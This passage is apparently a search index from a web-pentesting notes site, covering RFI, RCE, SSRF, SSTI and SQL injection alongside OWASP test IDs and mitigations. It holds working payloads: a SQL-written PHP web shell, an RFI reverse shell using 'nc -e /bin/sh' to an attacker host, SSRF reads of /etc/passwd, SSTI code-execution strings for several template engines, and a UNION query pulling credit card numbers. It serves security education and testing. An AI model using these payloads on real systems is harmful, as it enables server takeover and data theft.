injection, being the goal to deliver malware to end users of the system.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/reflected-file-download-rfd/#cool-proof-of-concept","title":"Cool proof of concept","text":"<p>https://medium.com/@Johne_Jacob/rfd-reflected-file-download-what-how-6d0e6fdbe331.</p> <p>Read more: https://hackerone.com/reports/39658</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/reflected-file-download-rfd/#prevention-and-mitigation","title":"Prevention and mitigation","text":"","tags":["pentesting","web pentesting"]},{"location":"webexploitation/reflected-file-download-rfd/#-x-content-type-options-nosniff-header-to-api-response","title":"- \"X-Content-Type-Options: nosniff\" header to API response.","text":"","tags":["pentesting","web pentesting"]},{"location":"webexploitation/reflected-file-download-rfd/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>See updated chart: Attacks and tools for web pentesting.</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/remote-code-execution-rce/","title":"RCE attack - Remote Code Execution","text":"OWASP <pre><code>[OWASP Web Security Testing Guide 4.2](../OWASP/index.md) &gt; 7. Data Validation Testing &gt; 7.8. Testing for SSI Injection\n</code></pre> ID Link to Hackinglife Link to OWASP Description 7.8 WSTG-INPV-08 Testing for SSI Injection - Identify SSI injection points (Presense of .shtml extension) with these characters:  &lt; ! # = / . \" - &gt; and [a-zA-Z0-9]  - Assess the severity of the injection. <p>RCE\u00a0attacks involve attackers manipulating network traffic by exploiting code vulnerabilities to access a corporate system.</p> <p>Exploiting Blind Remote Execution Vulnerability attack in a GET request in BurpSuite (to run the queries) and Wireshark (to capture the traffic).</p> <pre><code>________\nGET /script.php?c=sleep+5&amp;ok=ok HTTP/1.1\nHost 192.168.137.130\nUser Agent....\n...\n________\n</code></pre> <p>Also other command:</p> <pre><code>GET /script.php?c=ping+192.168.139.130+-c+5&amp;ok=ok HTTP/1.1\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/remote-code-execution-rce/#gaining-a-reverse-shell-from-sql-injection","title":"Gaining a reverse shell from SQL injection","text":"<p>Take a wordpress installation that uses a mysql database. If you manage to login into the mysql pannel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.</p> <pre><code>Select \"&lt;?php echo shell_exec($_GET['cmd']);?&gt;\" into outfile \"/var/www/https/blogblog/wp-content/uploads/shell.php\";\n</code></pre> <p>Now code can be executed from the browser: </p> <pre><code>https://example.com/blogblog/wp-content/uploads/shell.php?cmd=cat+/etc/passwd\n</code></pre> <p>One more example:</p> <pre><code>Select \"&lt;?php $output=shell_exec($_GET['cmd']);echo \"&lt;pre&gt;\".$output.\"&lt;/pre&gt;\"?&gt;\" into outfile \"/var/www/https/shell.php\" from mysql.user limit 1;\n</code></pre> <p>Now code can be executed from the browser: </p> <pre><code>https://example.com/shell.php?cmd=cat+/etc/passwd\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/remote-file-inclusion-rfi/","title":"RFI attack - Remote File Inclusion","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 5. Authorization Testing &gt; 5.1. Testing Directory Traversal File Include</p> ID Link to Hackinglife Link to OWASP Description 5.1 WSTG-ATHZ-01 Testing Directory Traversal File Include - Identify injection points that pertain to path traversal.  - Assess bypassing techniques and identify the extent of path traversal (dot-dot-slash attack, Local/Remote file inclusion) <p>A Remote File Inclusion (RFI) vulnerability is a type of security flaw found in web applications that allow an attacker to include and execute remote files on a web server. This vulnerability arises due to improper handling of user-supplied input within the context of file inclusion operations. This vulnerability can have severe consequences, including unauthorized access, data theft, and even full compromise of the affected server.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/remote-file-inclusion-rfi/#causes","title":"Causes","text":"<ul> <li>Insufficient Input Validation: The web application may not validate or filter user input, allowing attackers to inject malicious data.  </li> <li>Lack of Proper Sanitization: Even if input is validated, the application may not adequately sanitize the input before using it in file inclusion operations.</li> <li>Using User Input in File Paths: Applications that dynamically include files based on user input are at high risk if they don't carefully validate and control that input.</li> <li>Failure to Implement Security Controls: Developers might overlook security best practices, such as setting proper file permissions or using security mechanisms like web application firewalls (WAFs).</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/remote-file-inclusion-rfi/#how-to-exploit-it","title":"How to exploit it?","text":"<p>Identify Vulnerable Input: The attacker identifies a web application that accepts user input and uses it in a file inclusion operation, typically in the form of a URL parameter or a POST request parameter. </p> <p>Inject Malicious Payload: The attacker injects a malicious file path or URL into the vulnerable parameter. For example, they might replace a legitimate parameter like ?page=about.php with ?page=http://evil.com/malicious_script.</p> <p>Server Executes Malicious Code: When the web application processes the attacker's input, it dynamically includes the remote file or URL. This can lead to remote code execution on the web server, as the malicious code in the included file is executed in the server's context.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/remote-file-inclusion-rfi/#php","title":"php","text":"<p>In php.ini file there are some parameters that define this policy:</p> <ul> <li>allow_url_fopen</li> <li>allow_url_include</li> </ul> <p>If these functions are enabled (set to ON), then a LFI can turned into a Remote File Inclusion. </p> <p>1. Create a php file with the remote shell</p> <pre><code>nano reverse.txt\n</code></pre> <p>2.  In that php file, craft malicious code</p> <p><pre><code>&lt;?php\npassthru(\"nc -e /bin/sh &lt;attacker IP&gt; &lt;attacker port&gt;\") \nphp ?&gt;\n</code></pre> 3. Serve that file from you machine (http_serve).</p> <p>4. Get your machine listening in a port with netcat.</p> <p>5. In the injection point from where you can make a call to a URL, serve your file. For instance:</p> <pre><code>https:\\\\VICTIMurlADDRESS/PATH/PATH/page=http://&lt;attackerip&gt;/reverse.txt\n\n# Sometimes to get php executed on the victim machin (and not the attacker), add an ?\nhttps:\\\\VICTIMurlADDRESS/PATH/PATH/page=http://&lt;attackerip&gt;/reverse.txt?\n</code></pre> <p>Sometimes there might be some filtering for the payload (which was: </p> <pre><code>http://&lt;attackerip&gt;/reverse.txt?). \n````\n\nTo bypass it:\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/remote-file-inclusion-rfi/#using-uppercase","title":"using uppercase","text":"<p>https:\\VICTIMurlADDRESS/PATH/PATH/page=hTTP:///reverse.txt","tags":["pentesting","web pentesting"]},{"location":"webexploitation/remote-file-inclusion-rfi/#other-bypassing-techniques-for-slashes","title":"Other bypassing techniques for slashes","text":"<p><pre><code>## Wrappers\n\n### PHP wrapper\n\nphp://filter : allow the attacker to include local file and base64 encode as the output:\n</code></pre> http://IPdomain/rfi.php?language=php://filter/convert.base64-encode/resource=recurso.php <pre><code>PHP filter without base64 encode:\n</code></pre> php://filter/resource=flag.txt <pre><code>### DATA wrapper\n</code></pre> http://IPdomain/rfi.php?language=data://text/plain,&lt;?php system('$_GET(\"cmd\")');?&gt;&amp;cmd=whoami <pre><code>### HTTP wrapper\n</code></pre> http://IPdomain/rfi.php?language=http://SERVERIP/shell.php ```</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/remote-file-inclusion-rfi/#mitigation","title":"Mitigation","text":"<p>In php.ini disallow:</p> <ul> <li>allow_url_fopen</li> <li>allow_url_include</li> </ul> <p>User static file inclusion (instead of dynamic file inclusion) by harcoding the files you want to include and not get them using GET or POST methods. </p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/remote-file-inclusion-rfi/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>See updated chart: Attacks and tools for web pentesting.</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-request-forgery-ssrf/","title":"SSRF attack - Server Side Request Forgery","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.19. Testing for Server-Side Request Forgery</p> ID Link to Hackinglife Link to OWASP Description 7.19 WSTG-INPV-19 Testing for Server-Side Request Forgery - Identify SSRF injection points.  - Test if the injection points are exploitable.  - Asses the severity of the vulnerability. <p>Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location. The attacker could create a request to internet or to the intranet, which can be used to port scan or probe a remote machine. Basically, it could allow an atacker to:</p> <ul> <li>Take control of a remote machine.</li> <li>Read or update data.</li> <li>Read the server configuration.</li> <li>Connect to internal services...</li> </ul> <p>With:</p> <pre><code>http://\nfile:///\ndict://\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-request-forgery-ssrf/#exploitation","title":"Exploitation","text":"","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-request-forgery-ssrf/#load-the-contents-of-a-file","title":"Load the Contents of a File","text":"<pre><code>GET https://example.com/page?page=https://malicioussite.com/shell.php\n</code></pre> <p>See Burpsuite Labs</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-request-forgery-ssrf/#read-files-from-restricted-resources","title":"Read files from restricted resources","text":"<pre><code>GET https://example.com/page?page=https://localhost:8080/admin\nGET https://example.com/page?page=https://127.0.0.1:8080/admin\nGET https://example.com/page?page=file:///etc/passwd\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-request-forgery-ssrf/#read-files-from-other-backend-systems","title":"Read files from other backend systems","text":"<p>In some cases, the application server is able to interact with back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses.</p> <pre><code>GET https://example.com/page?page=https://localhost:3306/\nGET https://example.com/page?page=https://localhost:6379/\nGET https://example.com/page?page=https://localhost:8080/\n</code></pre> <p>Gopherus sends non authenticated requests to other services and it succedde</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-request-forgery-ssrf/#techniques","title":"Techniques","text":"<p>Bypass blacklist-based input filters</p> <p>Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using the following techniques:</p> <ul> <li>Use an alternative IP representation of\u00a0<code>127.0.0.1</code>, such as\u00a0<code>2130706433</code>,\u00a0<code>017700000001</code>, or\u00a0<code>127.1</code>.</li> <li>Register your own domain name that resolves to\u00a0<code>127.0.0.1</code>. You can use\u00a0<code>spoofed.burpcollaborator.net</code>\u00a0for this purpose.</li> <li>Obfuscate blocked strings using URL encoding or case variation.</li> <li>Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an\u00a0<code>http:</code>\u00a0to\u00a0<code>https:</code>\u00a0URL during the redirect has been shown to bypass some anti-SSRF filters.</li> </ul> <p>Bypass whitelist-based input filters</p> <p>Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.</p> <ul> <li>Using the\u00a0<code>@</code>\u00a0character to separate between the userinfo and the host:\u00a0`https://expected-host:fakepassword@evil-host</li> <li>URL fragmentation with the\u00a0<code>#</code>\u00a0character:\u00a0<code>https://attacker-domain#expected-domain</code></li> <li>You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: - <code>https://expected-host.evil-host</code></li> <li>URL encoding. Double URL-encode characters to confuse the URL-parsing code.</li> <li>Fuzzing</li> <li>Combinations of all of the above</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-request-forgery-ssrf/#exploiting-redirection-vulnerabilities","title":"Exploiting redirection vulnerabilities","text":"<p>It is sometimes possible to bypass filter-based defenses by exploiting an open redirection vulnerability.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-request-forgery-ssrf/#resources","title":"Resources","text":"<ul> <li>Portswigger: https://portswigger.net/web-security/ssrf.</li> <li>Portswigger labs.</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-request-forgery-ssrf/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>See updated chart: Attacks and tools for web pentesting.</li> <li>Gopherus.</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/","title":"Server-side Template Injection (SSTI)","text":"","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#what-is-ssti","title":"What is SSTI?","text":"<p>Web applications frequently use template systems to embed dynamic content in web pages and emails. </p> <p>For instance, ASP framework (Razor), PHP framework (Twig, Symfony, Smarty, Laravel, Slim, Plates), Python frameworks (django, mako, jinja2), Java frameworks (Groovy, Freemarker, Jinjava, Pebble,  Thymeleaf, Velocity, Spring, patTemplate, Expression Language EL), Javascript frameworks (Handlebars, Codepen, Lessjs, Lodash), Ruby framework (ERB, Slim).</p> <p>Server-side Template Injection vulnerabilities (SSTI) occur when user input is trusted when embedding a template, which is an unsafe implementation and might lead to remote code execution on the server. </p> OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.18. Testing for Server-side Template Injection</p> ID Link to Hackinglife Link to OWASP Description 7.18 WSTG-INPV-18 Testing for Server-side Template Injection - Detect template injection vulnerability points. - Identify the templating engine.  - Build the exploit. Resources for these notes <ul> <li>Portswigger: Server-Side Template Injection</li> <li>Hacktricks: SSTI payloads</li> </ul> Payloads <ul> <li>PayloadsAllTheThings for SSTI</li> </ul> <p>Snipped of vulnerable source code:</p> <pre><code>custom_email={{self}}\n</code></pre> <p></p> <p>What we have here is essentially server-side code execution inside a sandbox.  Depending on the template engine used, it may be possible execute arbitrary code directly or even to escape the sandbox and execute it. Following the example, in this POST request the expected email value has been replaced by a payload and it gets executed:</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#exploitation","title":"Exploitation","text":"","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#1-detect-injection-points","title":"1. Detect injection points","text":"<p>Template languages use syntax chosen explicitly not to clash with characters used in normal HTML, so it's easy for a manual blackbox security assessment to miss template injection entirely.\u00a0To detect it, we need to invoke the template engine by embedding a statement. </p> <p>Here\u2019s a simple example of using Twig in a PHP application. This would be the exampletemplate.twig:</p> <pre><code>&lt;!DOCTYPE html&gt;  \n&lt;html&gt;  \n&lt;head&gt;  \n    &lt;title&gt;{{ title }}&lt;/title&gt;  \n&lt;/head&gt;  \n&lt;body&gt;  \n    &lt;h1&gt;Hello, {{ name }}!&lt;/h1&gt;  \n&lt;/body&gt;  \n&lt;/html&gt;\n</code></pre> <p>And the PHP rendering the Twig template:</p> <pre><code>&lt;?php  \nrequire_once 'example/page.php';  \n\n$loader = new \\Twig\\Loader\\FilesystemLoader(__DIR__);  \n$twig = new \\Twig\\Environment($loader);  \n\n$template = $twig-&gt;load('exampletemplate.twig');  \necho $template-&gt;render(['title' =&gt; 'Twig Example', 'name' =&gt; 'John']);  \n?&gt;\n</code></pre> <p>Now, coming back to our web app, we could curl the following:</p> <pre><code>$ curl -g 'http://www.target.com/page?name={{7*7}}'\n</code></pre> <p>With SSTI the response would be:</p> <pre><code>Hello 49!\n</code></pre> <p>Trick:There are a huge number of template languages but many of them share basic syntax characteristics. We can take advantage of this by sending generic, template-agnostic payloads using basic operations to detect multiple template engines with a single HTTP request. This polyglot payload will trigger an error in presence of a SSTI vulnerability:</p> <pre><code>${{&lt;%[%'\"}}%\\.\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#2-identify-the-template-engine","title":"2. Identify the template engine","text":"<p>After detecting template injection, the next step is to identify the template engine in use.</p> <p>Green and red arrows represent 'success' and 'failure' responses respectively. In some cases, a single payload can have multiple distinct success responses - for example, the probe\u00a0{{7*'7'}}\u00a0would result in 49 in Twig, 7777777 in Jinja2, and neither if no template language is in use.</p> <p></p> Payloads for different Template engines <ul> <li>PayloadsAllTheThings for SSTI</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#3-exploitation","title":"3. Exploitation","text":"<p>Once you discover a server-side template injection vulnerability, and identify the template engine being used, successful exploitation typically involves the following process.</p> <ul> <li> <p>Read</p> <ul> <li>Template syntax</li> <li>Security documentation</li> <li>Documented exploits</li> </ul> </li> <li> <p>Explore the environment: </p> </li> </ul> <p>Many template engines expose a \"self\" or \"environment\" object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine. If such an object exists, you can potentially use it to generate a list of objects that are in scope. </p> <p>It is important to note that websites will contain both built-in objects provided by the template and custom, site-specific objects that have been supplied by the web developer. You should pay particular attention to these non-standard objects</p> <ul> <li>Create a custom attack</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#1-java-frameworks","title":"1. Java frameworks","text":"<p>Many template engines expose a \"self\" or \"environment\" object. In Java-based templating languages, you can sometimes list all variables in the environment using the following injection:</p> <pre><code>${T(java.lang.System).getenv()}\n</code></pre> <p>This can form the basis for creating a shortlist of potentially interesting objects and methods to investigate further. Additionally, for Burp Suite Professional users, the Intruder provides a built-in wordlist for brute-forcing variable names.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#11-freemarker","title":"1.1. FreeMarker","text":"<p>Basic payloads:</p> <pre><code>{{7*7}}\n# return {{7*7}}\n\n${7*7}\n#return 49\n\n#{7*7}\n#return 49 -- (legacy)\n\n${7*'7'}\n#return nothing\n</code></pre> <p>RCE in FreeMarker:</p> <pre><code>&lt;#assign ex = \"freemarker.template.utility.Execute\"?new()&gt;${ ex(\"id\")}\n[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}\n${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n\n${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(\" \")}\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#12-velocity","title":"1.2. Velocity","text":"<p>RCE in Velocity:</p> <pre><code>$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"sleep 5\").waitFor()   \n\n[5 second time delay]   \n0\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#2-php-frameworks","title":"2. PHP frameworks","text":"","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#21-smarty","title":"2.1. Smarty","text":"<p>RCE in Smarty</p> <pre><code>{php}echo `id`;{/php}\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#3-python-frameworks","title":"3. Python frameworks","text":"","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#31-mako","title":"3.1. Mako","text":"<p>RCE in Mako</p> <pre><code>&lt;%   import os   x=os.popen('id').read()   %&gt;   ${x}\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#32-tornado","title":"3.2. Tornado","text":"<p>Basic payloads:</p> <pre><code>{{7*7}}\n# return 49\n\n${7*7}\n# return ${7*7}\n\n{{foobar}}\n#return Error\n\n{{7*'7'}}\n# return 7777777\n</code></pre> <p>RCE in Tornado:</p> <pre><code>{{os.system('whoami')}}\n\n\n{% import os %}{{ os.popen(\"whoami\").read() }}\n</code></pre> <p>Useful tips to create SSTI exploit for Tornado:</p> <ul> <li>Anything coming between\u00a0{{\u00a0and\u00a0}}\u00a0are evaluated and send back to the output.</li> </ul> <p><code>{{ 2*2 }}</code>\u00a0-&gt; 4</p> <ul> <li>{% import module %} - Allows you to import python modules.</li> </ul> <p><code>{% import subprocess %}</code></p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#4-ruby-frameworks","title":"4. Ruby frameworks","text":"","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#41-erb","title":"4.1. ERB","text":"<p>Basic injection:</p> <pre><code>&lt;%= 7 * 7 %&gt;\n</code></pre> <p>Retrieve /etc/passwd</p> <pre><code>&lt;%= File.open('/etc/passwd').read %&gt;\n</code></pre> <p>List files and directories</p> <pre><code>&lt;%= Dir.entries('/') %&gt;\n\n\n&lt;%= File.open('/example/arbitrary-file').read %&gt;\n</code></pre> <p>Code execution</p> <pre><code>&lt;%= system('cat /etc/passwd') %&gt;\n&lt;%= `ls /` %&gt;\n&lt;%= IO.popen('ls /').readlines()  %&gt;\n&lt;% require 'open3' %&gt;&lt;% @a,@b,@c,@d=Open3.popen3('whoami') %&gt;&lt;%= @b.readline()%&gt;\n&lt;% require 'open4' %&gt;&lt;% @a,@b,@c,@d=Open4.popen4('whoami') %&gt;&lt;%= @c.readline()%&gt;\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#tools","title":"Tools","text":"<ul> <li>Tplmap</li> <li>Backslash Powered Scanner Burp Suite extension</li> <li>Template expression test strings/payloads list</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/server-side-template-injection-ssti/#related-lab","title":"Related lab","text":"<p>HackTheBox: Nunchunks: Express server with a nunjucks template engine.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/session-puzzling-or-session-variable-overloading/","title":"Session Puzzling - Session Variable Overloading","text":"<p>Owasp vuln description: https://owasp.org/www-community/vulnerabilities/Session_Variable_Overloading.</p> <p>Session Variable Overloading (also known as Session Puzzling, or Temporal Session Race Conditions) is an application level vulnerability which can enable an attacker to perform a variety of malicious actions. This vulnerability occurs when an application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set one one context and then used in another.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/session-puzzling-or-session-variable-overloading/#demo","title":"Demo","text":"<p>From 2011!!!!!!</p> <pre><code>&lt;iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/-DackF8HsIE\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen&gt;&lt;/iframe&gt;\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/session-puzzling-or-session-variable-overloading/#tools-and-payloads","title":"Tools and payloads","text":"<ul> <li>See updated chart: Attacks and tools for web pentesting.</li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/","title":"SQL injection","text":"<p>Related resources</p> <ul> <li>Detailed SQLi Cheat sheet for manual attack.</li> </ul> <p>SQL stands for Structure Query Language. SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database: to view data, to retrieve it, to modify it, to delete it, to compromise the infrastructure with what is known for instance as a denial of service attack.</p> OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.5. Testing for SQL Injection</p> ID Link to Hackinglife Link to OWASP Description 7.5 WSTG-INPV-05 Testing for SQL Injection - Identify SQL injection points.  - Assess the severity of the injection and the level of access that can be achieved through it. Sources for these notes <ul> <li>My Ine: eWPTv2.</li> <li>Hacktricks.</li> <li>OWASP: WSTG Testing for SQL injection.</li> <li>Notes during the Cibersecurity Bootcamp at The Bridge.</li> <li>Experience pentesting applications.</li> </ul> Languages and dictionaries Server Dictionary MySQL MySQL payloads. MSSQL MSSQL payloads. PostgreSQL PostgreSQL payloads. Oracle Oracle SQL payloads. SQLite SQLite payloads. Cassandra Cassandra payloads. Attack-based dictionaries <ul> <li>Generic SQL Injection Payloads</li> <li>Generic Error Based Payloads.</li> <li>Generic Union Select Payloads.</li> <li>SQL time based payloads .</li> <li>SQL Injection Auth Bypass Payloads </li> </ul>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#how-does-sql-injection-work","title":"How does SQL injection work?","text":"<p>1. Retrieving hidden data</p> <p>Examples at a shopping application </p> Request URL SQL Query Explained http://insecure-website.com/products?category=Gifts SELECT * FROM products WHERE category='Gift' AND release=1 Restriction \"released\" is being used to hide products that are not released. Unreleased products will be presumably released=0 http://insecure-website.com/products?category=Gifts'-- SELECT * FROM products WHERE category='Gift'--' AND released=1 Explained: Double dash sequence -- is a comment indicator in SQL which means that the rest of the query is interpretated as a comment. The application will display all the products in a category, being released or not. https://insecure-website.com/products?category=Gifts'+OR+1=1-- SELECT * FROM products WHERE category='Gifts' OR 1=1--' AND released=1 This will return all items where category is Gifts, or 1=1. Since 1=1 is always true, the query will return all items. <p>2.  Subverting application logic</p> Request URL SQL Query Explained Login SELECT * FROM users WHERE username=\"admin\" AND password=\"lalalala\" Login process, probably with a POST method Login: Adding admin'-- in the username and '' in the password field SELECT * FROM users where username=\"admin'-- AND password='' This query returns the user whose name is admin and succesfully logs the attacker as that user.","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#clasification","title":"Clasification","text":"<p>SQLi (for SQL injection) typically falls under three categories.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#1-in-band-sqli-or-classic-sql-injection","title":"1. In-band SQLi / or Classic SQL injection","text":"<p>In-band SQL injection is the most common type of SQL injection attack. It occurs when an attacker uses the same communication channel to send the attack and receive the results. In other words, the attacker injects malicious SQL code into the web application and receives the results of the attack through the same channel used to submit the code. In-band SQL injection attacks are dangerous because they can be used to steal sensitive information, modify or delete data, or take over the entire web application or even the entire server. Attacks are sent from the same channel in which results are collected.</p> <p>In-band SQL injection can be further divided into two subtypes/exploitation techniques:</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#11-error-based-sqli","title":"1.1. Error-based SQLi","text":"<p>Error-based SQL injection: In error-based SQL injection, the attacker injects SQL code that causes the web application to generate an error message. The error message can contain valuable information about the database schema or the contents of the database itself, which the attacker can use to further exploit the vulnerability.  </p> <p>The attacker performs actions that cause the database to produce error messages. The attacker can potentially use the data provided by these error messages to gather information about the structure of the database.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#12-union-based-sqli","title":"1.2. Union-based SQLi","text":"<p>The UNION operator is used in SQL to combine the results of two or more SELECT statements into a single result set. Therefore, it requires that the number of columns and their data types match in the SELECT statements being combined.</p> <p>Union-based SQL injection: In union-based SQL injection, the attacker injects additional SELECT statements through the vulnerable input. By manipulating the injected SQL code, the attacker can extract data from the database that they are not authorized to access.</p> <p>Here's an example to illustrate the concept. Consider the following vulnerable code snippet:</p> <pre><code>SELECT id, name FROM users WHERE id = '&lt;user_input&gt;'\n</code></pre> <p>An attacker can exploit this vulnerability by injecting a UNION-based attack payload into the  parameter. They could inject a statement like: <pre><code>' UNION SELECT credit_card_number, 'hack' FROM credit_cards --\n</code></pre> <p>The injected payload modifies the original query to retrieve the credit card numbers along with a custom value ('hack') from the credit_cards table. The double dash at the end is used to comment out the remaining part of the original query.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#2-inferential-blind-sqli","title":"2. Inferential (Blind) SQLi","text":"<p>Blind SQL Injection is a type of SQL Injection attack where an attacker can exploit a vulnerability in a web application that does not directly reveal information about the database or the results of the injected SQL query. In this type of attack, the attacker injects malicious SQL code into the application's input field, but the application does not return any useful information or error messages to the attacker in the response. The attacker typically uses various techniques to infer information about the database, such as time delays or Boolean logic. The attacker may inject SQL code that causes the application to delay for a specified amount of time, depending on the result of a query.</p> <p>Blind SQL injection can be further divided into two subtypes/exploitation techniques: </p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#21-boolean-based-content-based-blind-sqli","title":"2.1. Boolean-based (content-based) Blind SQLi","text":"<p>Boolean-based SQL Injection: In this type of attack, the attacker  exploits the application's response to boolean conditions to infer information about the database. The attacker sends a malicious SQL query to the application and evaluates the response based on whether the query executed successfully or failed.</p> <p>Inferential SQL injection technique that relies on sending a SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result.</p> <p>See this example:</p> <pre><code>' OR LENGTH(database()) &gt; 5--\n</code></pre> <p>This payload test whether the length of the database name is greater than 5 characters. Afterwards, you can start testing each character and, therefore, retrieve the name of the database.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#22-time-based-blind-sqli","title":"2.2. Time-Based Blind SQLi","text":"<p>Time-based Blind Injection: In this type of attack, the attacker exploits the application's response time to infer information about the  database. The attacker sends a malicious SQL query to the application and measures the time it takes for the application to respond.</p> <p>If you don't get a TRUE or FALSE response, sometimes you may infer if it is TRUE or FALSE based on time of response. Time-based SQL injection is a inferential SQL injection technique that relies on sending a SQL query to the database, which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#3-out-of-band-sqli","title":"3. Out-of-Band SQLi","text":"<p>Out-of-band SQL Injection is the least common type of SQL injection attack. It involves an attacker exploiting a vulnerability in a web application to extract data from a database using a different channel, other than the web application itself. Unlike in-band SQL Injection, where the attacker can observe the result of the injected SQL query in the application's response, out-of-band SQL Injection does not require the attacker to receive any response from the application. The attacker can use various techniques to extract data from the database, such as sending HTTP requests to an external server controlled by the attacker or using DNS queries to extract data.</p> <p>It's used when an attacker is unabled to use the same channel to launch the attack and gather results. Out-of-band SQLi techniques would rely on the database server's ability to make DNS or HTTP request to deliver data to an attacker.</p> <p>Such is the case of Microsoft SQL Server's xp_dirtree command, which can be used to make DNS request to a server that an attacker controls, as well as Oracle Database's UTL_HTTP package, which can be used to send HTTP requests from SQL and PL/SQL ti a server that an attacker controls.</p>","tags":["pentesting","web pentesting"]},{"location":"webexploitation/sql-injection/#databases","title":"Databases","text":"<p>In computing, a database is typically managed by a Database Management System (DBMS) that provides a set of tools and interfaces to interact with the data. DBMS stands for \"Database Management System\". It is a software system that enables users to create, store, organize, manage, and retrieve data from a database.</p> <p>DBMS provides an interface between the user and the database, allowing users to interact with the database without having to understand the underlying technical details of data storage, retrieval, and management. DBMS provides various functionalities such as creating, deleting, modifying, and querying the data stored in the database. It also manages security, concurrency control, backup, recovery, and other important aspects of data management.</p> <p>Types of databases:</p> <ul> <li>Relational Databases - A database that organizes data into one or more tables or relations, where each table represents an entity 